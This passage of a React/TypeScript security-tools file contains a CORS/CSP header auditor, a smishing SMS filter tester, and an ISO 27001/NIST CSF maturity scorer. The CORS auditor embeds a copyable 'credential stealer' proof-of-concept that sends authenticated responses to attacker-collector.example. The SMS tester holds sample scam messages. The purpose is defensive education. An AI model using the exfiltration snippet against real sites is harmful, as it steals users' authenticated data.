      <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-6 gap-2">
        {[
          { label: "HTTP/3 QUIC", val: http3, set: setHttp3 },
          { label: "WebSocket Upgrade", val: websocket, set: setWebsocket },
          { label: "HSTS Preload", val: hsts, set: setHsts },
          { label: "Gzip + Zstd", val: compression, set: setCompression },
          { label: "Rate Limit 20r/s", val: rateLimit, set: setRateLimit },
          { label: "Block .env / .git", val: blockDotfiles, set: setBlockDotfiles },
        ].map((item) => (
          <button
            key={item.label}
            type="button"
            onClick={() => item.set(!item.val)}
            className={`rounded-xs border px-2.5 py-2 font-mono-code text-xs text-left transition cursor-pointer ${
              item.val
                ? "border-emerald-500/50 bg-emerald-500/10 text-emerald-300 font-bold"
                : "border-border bg-background text-text-muted"
            }`}
          >
            {item.val ? "✓ " : "○ "} {item.label}
          </button>
        ))}
      </div>

      {/* Server Config Tabs */}
      <div className="rounded-xs border border-border bg-background p-3.5">
        <div className="flex flex-wrap items-center justify-between gap-2 mb-2.5">
          <div className="flex gap-1.5">
            {(["nginx", "apache", "caddy"] as const).map((t) => (
              <button
                key={t}
                type="button"
                onClick={() => setServerTab(t)}
                className={`rounded-xs px-3 py-1 font-heading text-xs font-bold uppercase cursor-pointer ${
                  serverTab === t
                    ? "bg-[#ff6a00] text-white"
                    : "border border-border bg-surface text-text-muted hover:text-text"
                }`}
              >
                {t === "nginx" ? "nginx.conf" : t === "apache" ? "Apache VirtualHost" : "Caddyfile"}
              </button>
            ))}
          </div>
          <InlineCopyButton text={activeCode} label={`Copy ${serverTab}`} />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-3 font-mono-code text-xs text-text">
          {activeCode}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 11. OWASP CORS & CONTENT-SECURITY-POLICY (CSP) VULNERABILITY AUDITOR
 *     Slug: owasp-cors-csp-vulnerability-auditor
 * ========================================================================== */
const HEADER_PRESETS: { label: string; headers: string }[] = [
  {
    label: "Vulnerable Reflected Origin + Credentials CORS",
    headers: `HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil-attacker.example
Access-Control-Allow-Credentials: true
Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'
X-Powered-By: Express`,
  },
  {
    label: "Weak CSP with unsafe-inline & unsafe-eval",
    headers: `HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:;
Strict-Transport-Security: max-age=3600`,
  },
  {
    label: "Hardened Strict Nonce CSP + Safe CORS",
    headers: `HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.zerosuniverse.com
Vary: Origin
Content-Security-Policy: default-src 'none'; script-src 'nonce-rAnd0mN0nc3Base64' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none';
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY`,
  },
];

function OwaspCorsCspVulnerabilityAuditor({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [rawHeaders, setRawHeaders] = useState(HEADER_PRESETS[0].headers);

  useEffect(() => {
    setRawHeaders(HEADER_PRESETS[0].headers);
  }, [resetTrigger]);

  const audit = useMemo(() => {
    const acao = rawHeaders.match(/^Access-Control-Allow-Origin:\s*(.+)$/im)?.[1]?.trim() || "";
    const acac =
      rawHeaders.match(/^Access-Control-Allow-Credentials:\s*(.+)$/im)?.[1]?.trim().toLowerCase() ===
      "true";
    const varyOrigin = /Vary:.*Origin/i.test(rawHeaders);
    const csp = rawHeaders.match(/^Content-Security-Policy:\s*(.+)$/im)?.[1]?.trim() || "";
    const hsts = rawHeaders.match(/^Strict-Transport-Security:\s*(.+)$/im)?.[1]?.trim() || "";

    const issues: { severity: "CRITICAL" | "HIGH" | "MEDIUM"; title: string; detail: string }[] = [];
    let score = 100;

    const corsExploitable = Boolean(acao && acao !== "*" && acac && (!varyOrigin || /evil|null/i.test(acao)));
    if (corsExploitable || (acao === "null" && acac)) {
      score -= 45;
      issues.push({
        severity: "CRITICAL",
        title: "CORS Arbitrary Origin Reflection + Allow-Credentials: true",
        detail: "Any third-party website can read authenticated JSON responses cross-origin using fetch(..., { credentials: 'include' }).",
      });
    } else if (acao === "*") {
      score -= 10;
      issues.push({
        severity: "MEDIUM",
        title: "Wildcard Access-Control-Allow-Origin: *",
        detail: "Safe only for public unauthenticated CDN assets; ensure no sensitive endpoints return '*'.",
      });
    }

    if (!csp) {
      score -= 30;
      issues.push({
        severity: "HIGH",
        title: "Missing Content-Security-Policy Header",
        detail: "Browser has zero mitigation against Reflected/Stored DOM XSS injection.",
      });
    } else {
      if (csp.includes("'unsafe-inline'")) {
        score -= 25;
        issues.push({
          severity: "HIGH",
          title: "CSP Permits 'unsafe-inline' Script Execution",
          detail: "Attacker injected <script> tags or inline event handlers will execute freely. Replace with cryptographic nonces.",
        });
      }
      if (csp.includes("'unsafe-eval'")) {
        score -= 15;
        issues.push({
          severity: "HIGH",
          title: "CSP Permits 'unsafe-eval'",
          detail: "Allows eval(), Function(), and string-based setTimeout() DOM XSS sinks.",
        });
      }
      if (!csp.includes("object-src 'none'")) {
        score -= 10;
        issues.push({
          severity: "MEDIUM",
          title: "Missing object-src 'none' Directive",
          detail: "Recommend explicitly disabling legacy plugin/object execution.",
        });
      }
    }

    if (!hsts || !hsts.includes("63072000")) {
      score -= 10;
      issues.push({
        severity: "MEDIUM",
        title: "Missing or Short Strict-Transport-Security (HSTS)",
        detail: "Use max-age=63072000; includeSubDomains; preload.",
      });
    }

    score = Math.max(0, score);

    const pocJs = `// Proof-of-Concept Cross-Origin Authenticated Data Exfiltration
fetch("https://vulnerable-target.example/api/v1/user/profile", {
  method: "GET",
  credentials: "include"
})
  .then(r => r.text())
  .then(data => fetch("https://attacker-collector.example/log?leak=" + encodeURIComponent(data)));`;

    return { acao, acac, csp, score, issues, pocJs };
  }, [rawHeaders]);

  useEffect(() => {
    setOutput(
      [
        `=== OWASP CORS & CSP RESPONSE HEADER AUDIT ===`,
        `Header Hardening Score: ${audit.score}/100`,
        `ACAO: ${audit.acao || "None"} | ACAC: ${String(audit.acac)}`,
        `CSP: ${audit.csp || "Missing"}`,
        ``,
        ...audit.issues.map((i) => `[${i.severity}] ${i.title}\n  -> ${i.detail}`),
        ``,
        `=== CORS EXPLOIT POC ===`,
        audit.pocJs,
      ].join("\n")
    );
  }, [audit, setOutput]);

  return (
    <div className="space-y-4">
      <div className="flex flex-wrap gap-1.5">
        {HEADER_PRESETS.map((p) => (
          <button
            key={p.label}
            type="button"
            onClick={() => setRawHeaders(p.headers)}
            className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs transition cursor-pointer ${
              rawHeaders === p.headers
                ? "border-accent bg-accent/10 text-accent"
                : "border-border bg-background text-text-muted hover:text-text"
            }`}
          >
            {p.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        <div>
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Paste HTTP Response Headers (`curl -I https://...`)
          </label>
          <textarea
            rows={8}
            value={rawHeaders}
            onChange={(e) => setRawHeaders(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
          />
        </div>

        <div className="space-y-2.5">
          <div className="rounded-xs border border-border bg-background p-3.5 flex items-center justify-between">
            <div>
              <span className="text-[10px] font-heading uppercase text-text-muted block">
                OWASP Header Hardening Score
              </span>
              <span
                className={`font-mono-code text-2xl font-bold ${
                  audit.score >= 85
                    ? "text-emerald-400"
                    : audit.score >= 50
                    ? "text-amber-400"
                    : "text-rose-400"
                }`}
              >
                {audit.score} / 100
              </span>
            </div>
            <Shield className="h-7 w-7 text-accent" />
          </div>

          {audit.issues.length === 0 ? (
            <div className="rounded-xs border border-emerald-500/40 bg-emerald-500/10 p-3 text-xs text-emerald-300">
              All audited CORS and Content-Security-Policy directives meet strict OWASP Nonce + Origin Isolation standards.
            </div>
          ) : (
            <div className="space-y-2">
              {audit.issues.map((iss, idx) => (
                <div key={idx} className="rounded-xs border border-border bg-background p-2.5 text-xs">
                  <div className="flex items-center justify-between font-mono-code">
                    <span className="font-bold text-text">{iss.title}</span>
                    <span className="text-[10px] font-bold text-rose-400">{iss.severity}</span>
                  </div>
                  <p className="mt-1 text-[11px] text-text-muted">{iss.detail}</p>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>

      <div className="rounded-xs border border-border bg-background p-3.5">
        <div className="flex items-center justify-between mb-1">
          <span className="font-heading text-xs font-bold uppercase text-accent">
            Cross-Origin Credential Stealer PoC Snippet
          </span>
          <InlineCopyButton text={audit.pocJs} />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-2.5 font-mono-code text-xs text-text">
          {audit.pocJs}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 12. SMISHING & SPAM SMS HEURISTIC & REGEX FILTER TESTER
 *     Slug: smishing-spam-sms-regex-filter-tester
 * ========================================================================== */
const SMS_PRESETS: { label: string; text: string }[] = [
  {
    label: "Fake India Post / FedEx Customs Parcel Scam",
    text: "IndiaPost: Your parcel #IN8849201 is held at warehouse due to incomplete address pin code. Update within 24 hours to avoid return penalty: https://indiapost-track-customs.top/verify",
  },
  {
    label: "Urgent Bank KYC / PAN Suspension Smishing",
    text: "Dear Customer, your HDFC Bank NetBanking account will be blocked today as your PAN KYC is expired. Click bit.ly/hdfc-kyc-update99 immediately or call 9876543210 to verify OTP.",
  },
  {
    label: "Crypto Giveaway / Fake Job Task Scam",
    text: "Congrats! You are selected for part-time YouTube/Telegram task job. Earn ₹5000/day instant USDT payout! Contact HR on WhatsApp wa.me/919988776655 or install reward_vip.apk",
  },
  {
    label: "Legitimate Bank OTP Alert",
    text: "482910 is your One Time Password (OTP) for transaction of INR 1,240.00 at Amazon on card ending 4412. Valid for 10 mins. Do NOT share this OTP with anyone. -SBI",
  },
];

function SmishingSpamSmsRegexFilterTester({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [smsText, setSmsText] = useState(SMS_PRESETS[0].text);

  useEffect(() => {
    setSmsText(SMS_PRESETS[0].text);
  }, [resetTrigger]);

  const analysis = useMemo(() => {
    const indicators = [
      {
        name: "1. Obfuscated URL Shortener (bit.ly / tinyurl / cutt.ly / rb.gy)",
        matched: /\b(bit\.ly|tinyurl\.com|cutt\.ly|rb\.gy|is\.gd|t\.co)\/\S+/i.test(smsText),
        weight: 22,
      },
      {
        name: "2. High-Risk Disposable TLD (.top / .xyz / .buzz / .vip / .icu)",
        matched: /\.(top|xyz|buzz|vip|icu|loan|click|work)\b/i.test(smsText),
        weight: 25,
      },
      {
        name: "3. Coercive Account / Parcel / Electricity Urgency Threat",
        matched: /\b(blocked today|suspended|within 24 hours|held at warehouse|incomplete address|electricity disconnected|pan.*expired)\b/i.test(
          smsText
        ),
        weight: 20,
      },
      {
        name: "4. Brand Impersonation Paired with External Link",
        matched:
          /\b(indiapost|fedex|dhl|usps|hdfc|sbi|icici|axis)\b/i.test(smsText) &&
          /https?:\/\/|\bbit\.ly\b|\.(top|xyz)\b/i.test(smsText),
        weight: 20,
      },
      {
        name: "5. Daily Task Income / Crypto USDT Lure",
        matched: /\b(usdt|part-time|earn\s*[₹$]\s*\d+|telegram task)\b/i.test(smsText),
        weight: 22,
      },
      {
        name: "6. Unsolicited WhatsApp / Telegram / Mobile Callback",
        matched: /\b(wa\.me\/|t\.me\/|call\s+[6-9]\d{9})\b/i.test(smsText),
        weight: 18,
      },
      {
        name: "7. Malicious Android Sideload (.apk) Dropper Prompt",
        matched: /\.apk\b|install\s+.*app/i.test(smsText),
        weight: 30,
      },
      {
        name: "8. Cyrillic / Homoglyph Character Substitution",
        matched: /[\u0400-\u04FF]/.test(smsText),
        weight: 25,
      },
      {
        name: "9. Credential / OTP Harvesting Call-to-Action",
        matched: /\b(verify otp|update.*kyc|click.*immediately)\b/i.test(smsText),
        weight: 18,
      },
      {
        name: "10. Defensive Anti-Phishing Warning Present ('Do NOT share OTP')",
        matched: /do not share this otp/i.test(smsText),
        weight: -25,
      },
    ];

    const raw = indicators.reduce((acc, ind) => acc + (ind.matched ? ind.weight : 0), 0);
    const probability = Math.max(0, Math.min(100, raw));

    const regexRule = `(?i)(\\b(bit\\.ly|tinyurl\\.com|wa\\.me)\\/\\S+|https?:\\/\\/[^\\s]+\\.(top|xyz|buzz|vip|icu)\\b|\\b(pan\\s*kyc.*expired|held\\s+at\\s+warehouse|earn\\s*[₹$]\\d+\\/day|\\.apk)\\b)`;

    return { indicators, probability, regexRule };
  }, [smsText]);

  useEffect(() => {
    setOutput(
      [
        `=== SMISHING & SPAM SMS HEURISTIC ANALYSIS ===`,
        `Smishing Probability Score: ${analysis.probability}/100`,
        `SMS Content: "${smsText}"`,
        ``,
        `Heuristic Indicator Breakdown:`,
        ...analysis.indicators.map(
          (ind) => `  [${ind.matched ? "TRIGGERED" : "  CLEAN  "}] ${ind.name}`
        ),
        ``,
        `Android / iOS SMS Blocker Regex Rule:`,
        analysis.regexRule,
      ].join("\n")
    );
  }, [smsText, analysis, setOutput]);

  return (
    <div className="space-y-4">
      <div className="flex flex-wrap gap-1.5">
        {SMS_PRESETS.map((p) => (
          <button
            key={p.label}
            type="button"
            onClick={() => setSmsText(p.text)}
            className={`rounded-xs border px-2.5 py-1 font-mono-code text-xs transition cursor-pointer ${
              smsText === p.text
                ? "border-accent bg-accent/10 text-accent"
                : "border-border bg-background text-text-muted hover:text-text"
            }`}
          >
            {p.label}
          </button>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        <div className="lg:col-span-2">
          <label className="block font-heading text-[11px] font-bold uppercase text-text-muted mb-1">
            Paste Suspicious SMS Message Body
          </label>
          <textarea
            rows={4}
            value={smsText}
            onChange={(e) => setSmsText(e.target.value)}
            className="w-full rounded-xs border border-border bg-background p-3 font-mono-code text-xs text-text focus:border-accent focus:outline-none"
          />
        </div>
        <div className="rounded-xs border border-border bg-background p-4 flex flex-col justify-between">
          <div>
            <span className="text-[10px] font-heading uppercase text-text-muted block">
              Smishing Probability Score
            </span>
            <span
              className={`font-mono-code text-3xl font-bold ${
                analysis.probability >= 60
                  ? "text-rose-400"
                  : analysis.probability >= 30
                  ? "text-amber-400"
                  : "text-emerald-400"
              }`}
            >
              {analysis.probability}%
            </span>
            <div className="mt-1 text-xs font-bold text-text">
              {analysis.probability >= 60
                ? "CRITICAL: High-Confidence Smishing Scam"
                : analysis.probability >= 30
                ? "SUSPICIOUS: Verify Sender via Official App"
                : "LEGITIMATE TRANSACTIONAL / OTP"}
            </div>
          </div>
          <MessageSquareWarning className="h-6 w-6 text-accent self-end" />
        </div>
      </div>

      {/* 10 Heuristics Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
        {analysis.indicators.map((ind) => (
          <div
            key={ind.name}
            className={`flex items-center justify-between rounded-xs border px-3 py-2 font-mono-code text-xs ${
              ind.matched
                ? ind.weight < 0
                  ? "border-emerald-500/40 bg-emerald-500/10 text-emerald-300"
                  : "border-rose-500/40 bg-rose-500/10 text-rose-300"
                : "border-border bg-background text-text-muted"
            }`}
          >
            <span>{ind.name}</span>
            <span className="font-bold">
              {ind.matched ? (ind.weight > 0 ? `+${ind.weight}` : ind.weight) : "0"}
            </span>
          </div>
        ))}
      </div>

      <div className="rounded-xs border border-border bg-background p-3">
        <div className="flex items-center justify-between mb-1">
          <span className="font-heading text-[11px] font-bold uppercase text-accent">
            Custom PCRE Regex Filter (Android SpamBlocker / iOS Filter)
          </span>
          <InlineCopyButton text={analysis.regexRule} />
        </div>
        <pre className="overflow-x-auto rounded-xs bg-surface p-2 font-mono-code text-xs text-text">
          {analysis.regexRule}
        </pre>
      </div>

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 13. ISO 27001:2022 & NIST CSF 2.0 MATURITY GAP SCORER
 *     Slug: iso27001-nist-csf-maturity-gap-scorer
 * ========================================================================== */
interface CsfDomainItem {
  id: string;
  pillar: "GV" | "ID" | "PR" | "DE" | "RS" | "RC";
  pillarName: string;
  domain: string;
  isoControl: string;
  remediationAction: string;
}

const CSF_DOMAINS: CsfDomainItem[] = [
  { id: "gv1", pillar: "GV", pillarName: "Govern", domain: "Information Security Policy & Board Risk Charter", isoControl: "Annex A.5.1", remediationAction: "Publish executive-ratified ISMS charter and annual risk appetite thresholds." },
  { id: "gv2", pillar: "GV", pillarName: "Govern", domain: "Third-Party Vendor & Supply Chain Risk (SCRM)", isoControl: "Annex A.5.19", remediationAction: "Enforce SOC2/ISO27001 due diligence and DPA clauses for all sub-processors." },
  { id: "id1", pillar: "ID", pillarName: "Identify", domain: "Hardware, Cloud & Software Asset Inventory", isoControl: "Annex A.5.9", remediationAction: "Deploy automated cloud/endpoint asset discovery + SBOM registry." },
  { id: "id2", pillar: "ID", pillarName: "Identify", domain: "Vulnerability Scanning & SLA Patching", isoControl: "Annex A.8.8", remediationAction: "Enforce <72h patching SLA for CISA KEV / CVSS >= 9.0 vulnerabilities." },
  { id: "pr1", pillar: "PR", pillarName: "Protect", domain: "Phishing-Resistant MFA (FIDO2) & Least-Privilege IAM", isoControl: "Annex A.8.5", remediationAction: "Mandate FIDO2/WebAuthn passkeys on IdP and quarterly access reviews." },
  { id: "pr2", pillar: "PR", pillarName: "Protect", domain: "Data Encryption at Rest (AES-256) & Transit (TLS 1.3)", isoControl: "Annex A.8.24", remediationAction: "Enable KMS envelope encryption and automated TLS certificate rotation." },
  { id: "de1", pillar: "DE", pillarName: "Detect", domain: "Centralized SIEM Log Aggregation & Alerting", isoControl: "Annex A.8.15", remediationAction: "Stream immutable CloudTrail, IdP, and EDR telemetry into SIEM with detections." },
  { id: "de2", pillar: "DE", pillarName: "Detect", domain: "Endpoint Detection & Response (EDR) Coverage", isoControl: "Annex A.8.7", remediationAction: "Enforce 100% kernel-level EDR agent telemetry across workstations and servers." },
  { id: "rs1", pillar: "RS", pillarName: "Respond", domain: "Incident Response Playbooks & Tabletop Exercises", isoControl: "Annex A.5.24", remediationAction: "Run semi-annual ransomware & credential-compromise tabletop simulations." },
  { id: "rs2", pillar: "RS", pillarName: "Respond", domain: "Forensic Triage & Regulatory Breach Notification", isoControl: "Annex A.5.26", remediationAction: "Establish 72h GDPR/CERT-In reporting templates and automated host isolation." },
  { id: "rc1", pillar: "RC", pillarName: "Recover", domain: "Immutable Air-Gapped Backups (3-2-1-1-0 Rule)", isoControl: "Annex A.8.13", remediationAction: "Configure S3 Object Lock (WORM Compliance mode) + offline backup vault." },
  { id: "rc2", pillar: "RC", pillarName: "Recover", domain: "Disaster Recovery RTO/RPO Restoration Drills", isoControl: "Annex A.5.30", remediationAction: "Perform quarterly bare-metal/cloud restoration timing verification." },
];

function Iso27001NistCsfMaturityGapScorer({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [scores, setScores] = useState<Record<string, number>>({
    gv1: 2, gv2: 1, id1: 3, id2: 2, pr1: 3, pr2: 3,
    de1: 2, de2: 2, rs1: 1, rs2: 2, rc1: 2, rc2: 1,
  });

  const applyPreset = useCallback((vals: number[]) => {
    const next: Record<string, number> = {};
    CSF_DOMAINS.forEach((d, i) => {
      next[d.id] = vals[i] ?? 2;
    });
    setScores(next);
  }, []);

  useEffect(() => {
    applyPreset([2, 1, 3, 2, 3, 3, 2, 2, 1, 2, 2, 1]);
  }, [resetTrigger, applyPreset]);

  const summary = useMemo(() => {
    const pillars = ["GV", "ID", "PR", "DE", "RS", "RC"] as const;
    const pillarAvgs = pillars.map((p) => {
      const matching = CSF_DOMAINS.filter((d) => d.pillar === p);
      const avg = matching.reduce((acc, d) => acc + (scores[d.id] ?? 0), 0) / matching.length;
      return { pillar: p, name: matching[0].pillarName, avg: Number(avg.toFixed(2)) };
    });

    const overallAvg =
      Object.values(scores).reduce((a, b) => a + b, 0) / CSF_DOMAINS.length;

    const tier =
      overallAvg >= 3.3
        ? "Tier 4: Adaptive (Continuous Automated Improvement)"
        : overallAvg >= 2.5
        ? "Tier 3: Repeatable (Formally Approved & Audited ISMS)"
        : overallAvg >= 1.5
        ? "Tier 2: Risk-Informed (Partial Controls / Unstandardized)"
        : "Tier 1: Partial / Ad-Hoc (High Audit Failure Risk)";

    const priorityGaps = CSF_DOMAINS.filter((d) => (scores[d.id] ?? 0) <= 2).sort(
      (a, b) => (scores[a.id] ?? 0) - (scores[b.id] ?? 0)
    );

    return { pillarAvgs, overallAvg: Number(overallAvg.toFixed(2)), tier, priorityGaps };
  }, [scores]);

  useEffect(() => {
    setOutput(
      [
        `=== NIST CSF 2.0 & ISO/IEC 27001:2022 MATURITY REPORT ===`,
        `Overall Maturity Score: ${summary.overallAvg} / 4.00 -> ${summary.tier}`,
        ``,
        `Pillar Averages:`,
        ...summary.pillarAvgs.map((p) => `  - ${p.pillar} (${p.name}): ${p.avg} / 4.0`),
        ``,
        `=== PRIORITIZED 90-DAY COMPLIANCE ROADMAP ===`,
        ...summary.priorityGaps.map(
          (g, i) =>
            `${i + 1}. [${g.pillar} / ${g.isoControl}] ${g.domain} (Current: ${scores[g.id]}/4)\n   Action: ${g.remediationAction}`
        ),
      ].join("\n")
    );
  }, [summary, scores, setOutput]);

  return (
    <div className="space-y-4">
      {/* Organization Presets */}
      <div className="flex flex-wrap items-center gap-2">
        <span className="font-heading text-[11px] font-bold uppercase text-text-muted">
          Organization Profile Presets:
        </span>
        <button
          type="button"
          onClick={() => applyPreset([1, 0, 1, 1, 2, 2, 1, 1, 0, 0, 1, 0])}
          className="rounded-xs border border-border bg-background px-2.5 py-1 font-mono-code text-xs text-text-muted hover:text-text cursor-pointer"
        >
          Seed Startup (Tier 1)
        </button>
        <button
          type="button"
          onClick={() => applyPreset([2, 1, 3, 2, 3, 3, 2, 2, 1, 2, 2, 1])}
          className="rounded-xs border border-border bg-background px-2.5 py-1 font-mono-code text-xs text-text-muted hover:text-text cursor-pointer"
        >
          Growth SaaS (Tier 2/3)
        </button>
        <button
          type="button"
          onClick={() => applyPreset([4, 3, 4, 4, 4, 4, 4, 4, 3, 4, 4, 3])}
          className="rounded-xs border border-border bg-background px-2.5 py-1 font-mono-code text-xs text-text-muted hover:text-text cursor-pointer"
        >
          ISO-Certified Enterprise (Tier 4)
        </button>
      </div>

      {/* 12 Domain Sliders */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
        {CSF_DOMAINS.map((d) => (
          <div key={d.id} className="rounded-xs border border-border bg-background p-3">
            <div className="flex items-center justify-between text-xs">
              <span className="font-heading font-bold text-text">
                <span className="text-accent mr-1.5">[{d.pillar}]</span>
                {d.domain}
              </span>
              <span className="font-mono-code text-[11px] text-text-muted">{d.isoControl}</span>
            </div>
            <div className="mt-2 flex items-center gap-3">
              <input
                type="range"
                min={0}
                max={4}
                step={1}
                value={scores[d.id] ?? 0}
                onChange={(e) =>
                  setScores((prev) => ({ ...prev, [d.id]: Number(e.target.value) }))
                }
                className="w-full accent-[#ff6a00]"
              />
              <span className="font-mono-code text-xs font-bold text-accent w-12 text-right">
                {scores[d.id]}/4
              </span>
            </div>
          </div>
        ))}
      </div>

      {/* SVG 6-Pillar Bar Chart & Tier Summary */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        <div className="rounded-xs border border-border bg-background p-4 flex flex-col justify-between">
          <div>
            <span className="text-[10px] font-heading uppercase text-text-muted block">
              Composite NIST CSF 2.0 Maturity
            </span>
            <span className="font-mono-code text-3xl font-bold text-accent">
              {summary.overallAvg} / 4.00
            </span>
            <div className="mt-1 text-xs font-bold text-emerald-400">{summary.tier}</div>
          </div>
          <Award className="h-7 w-7 text-accent self-end" />
        </div>

        <div className="lg:col-span-2 rounded-xs border border-border bg-background p-3.5">
          <div className="font-heading text-xs font-bold uppercase text-text mb-2">
            NIST CSF 2.0 6-Function Maturity Profile (SVG)
          </div>
          <svg viewBox="0 0 520 120" className="w-full h-28 bg-surface rounded-xs border border-border/60">
            {summary.pillarAvgs.map((p, idx) => {
              const x = 25 + idx * 82;
              const barH = (p.avg / 4) * 75;
              return (
                <g key={p.pillar}>
                  <rect
                    x={x}
                    y={92 - barH}
                    width="44"
                    height={Math.max(3, barH)}
                    fill={p.avg >= 3 ? "#34d399" : p.avg >= 2 ? "#ff6a00" : "#fb7185"}
                    rx="2"
                  />
                  <text x={x + 6} y="86" fill="#ffffff" fontSize="10" fontFamily="monospace">
                    {p.avg}
                  </text>
                  <text x={x + 4} y="110" fill="#94a3b8" fontSize="10" fontFamily="monospace">
                    {p.pillar} ({p.name.slice(0, 3)})
                  </text>
                </g>
              );
            })}
          </svg>
        </div>
      </div>

      {/* Prioritized 90-Day Roadmap */}
      {summary.priorityGaps.length > 0 && (
        <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
          <div className="font-heading text-xs font-bold uppercase text-accent">
            Prioritized 90-Day ISO 27001 / NIST CSF Remediation Roadmap
          </div>
          <div className="space-y-1.5">
            {summary.priorityGaps.slice(0, 5).map((g) => (
              <div key={g.id} className="rounded-xs bg-surface p-2 text-xs font-mono-code">
                <div className="flex justify-between">
                  <span className="font-bold text-text">
                    [{g.pillar} • {g.isoControl}] {g.domain}
                  </span>
                  <span className="text-rose-400">Level {scores[g.id]}/4</span>
                </div>
                <div className="text-[11px] text-text-muted mt-0.5">→ {g.remediationAction}</div>
              </div>
            ))}
          </div>
        </div>
      )}

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * EXPORT WAVE 6 GROUP A CYBER PLAYGROUNDS (13 SLUGS)
 * ========================================================================== */
export const wave6CyberPlaygrounds: Record<string, React.ComponentType<{ tool: Tool }>> = {
  "webauthn-fido2-passkey-attestation-lab": WebauthnFido2PasskeyAttestationLab,
  "keystroke-dynamics-keylogger-timing-visualizer": KeystrokeDynamicsKeyloggerTimingVisualizer,
  "hashcat-john-hash-type-identifier": HashcatJohnHashTypeIdentifier,
  "malware-windows-api-iat-threat-analyzer": MalwareWindowsApiIatThreatAnalyzer,
  "botnet-c2-beacon-dga-netstat-analyzer": BotnetC2BeaconDgaNetstatAnalyzer,
  "cloud-iam-s3-policy-security-auditor": CloudIamS3PolicySecurityAuditor,
  "voip-sip-header-rtp-security-auditor": VoipSipHeaderRtpSecurityAuditor,
  "tcp-flag-port-scan-handshake-visualizer": TcpFlagPortScanHandshakeVisualizer,
  "digital-forensics-chain-of-custody-timeline-builder": DigitalForensicsChainOfCustodyTimelineBuilder,
  "nginx-apache-caddy-config-generator": NginxApacheCaddyConfigGenerator,
  "owasp-cors-csp-vulnerability-auditor": OwaspCorsCspVulnerabilityAuditor,
  "smishing-spam-sms-regex-filter-tester": SmishingSpamSmsRegexFilterTester,
  "iso27001-nist-csf-maturity-gap-scorer": Iso27001NistCsfMaturityGapScorer,
};
